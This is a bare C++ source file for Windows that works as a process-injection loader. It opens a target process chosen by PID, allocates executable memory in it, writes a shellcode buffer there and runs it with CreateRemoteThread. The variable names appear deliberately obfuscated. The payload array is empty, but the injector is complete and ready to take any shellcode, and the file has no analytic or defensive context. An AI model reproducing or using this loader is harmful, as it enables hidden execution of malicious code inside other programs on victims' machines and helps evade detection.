#include "windows.h"
#include <iostream>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char htzt[] = "";

	HANDLE lsty;
	HANDLE nxrt;
	PVOID asxzz;

	lsty = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	asxzz = VirtualAllocEx(lsty, NULL, sizeof htzt, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(lsty, asxzz, htzt, sizeof htzt, NULL);
	nxrt = CreateRemoteThread(lsty, NULL, 0, (LPTHREAD_START_ROUTINE)asxzz, NULL, 0, NULL);
	CloseHandle(lsty);

	return 0;
} 